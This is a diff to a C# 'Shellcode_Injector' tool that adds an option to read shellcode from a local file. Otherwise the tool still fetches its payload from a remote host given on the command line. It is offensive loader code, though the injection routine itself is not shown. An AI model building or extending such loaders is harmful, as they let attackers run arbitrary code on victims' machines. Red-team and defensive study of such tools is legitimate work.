@@ -12,10 +12,17 @@ namespace Shellcode_Injector
             new WinApi();
             //Parse command line flags
             var arguments = new Parser(args);
+            byte[] shellcode;
 
-            //Fetch shellcode
-            byte[] shellcode = Helpers.Fetch(arguments.shellcode["host"], arguments.shellcode["file"]);
-
+            //Fetch shellcode from local file 
+            if (arguments.shellcode["local"] != "")
+            {
+                shellcode = Helpers.ReadLocal(arguments.shellcode["local"]);
+            }
+            else //Assume remote shellcode
+            {
+                shellcode = Helpers.Fetch(arguments.shellcode["host"], arguments.shellcode["file"]);
+            }
             //Define Process info
             WinApi.PIN pinfo = new WinApi.PIN();
 
